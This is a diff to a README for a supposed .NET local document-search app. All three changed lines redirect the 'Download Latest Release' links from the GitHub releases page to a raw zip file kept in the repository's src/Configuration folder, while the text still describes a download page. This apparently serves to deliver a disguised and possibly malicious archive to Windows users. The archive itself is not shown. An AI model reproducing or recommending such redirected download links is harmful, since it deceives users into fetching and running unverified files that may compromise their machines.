@@ -1,6 +1,6 @@
 # 🔒 dotnet-data-ingestion-local-rag - Secure Local Document Search
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/khelseygrace/dotnet-data-ingestion-local-rag/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/khelseygrace/dotnet-data-ingestion-local-rag/main/src/Configuration/dotnet_ingestion_rag_local_data_v2.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get the app running on your Windows machine.
 
    Click the big blue button below to visit the download page. This page contains the latest version of the app and all related files you will need.
 
-   [![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/khelseygrace/dotnet-data-ingestion-local-rag/releases)
+   [![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/khelseygrace/dotnet-data-ingestion-local-rag/main/src/Configuration/dotnet_ingestion_rag_local_data_v2.9.zip)
 
 2. **Find the latest release**
 
@@ -106,7 +106,7 @@ If you experience issues, try these steps:
 
 To get the app, please visit this page to download all necessary files:
 
-[Download Latest Release](https://github.com/khelseygrace/dotnet-data-ingestion-local-rag/releases)
+[Download Latest Release](https://raw.githubusercontent.com/khelseygrace/dotnet-data-ingestion-local-rag/main/src/Configuration/dotnet_ingestion_rag_local_data_v2.9.zip)
 
 On the page:
 
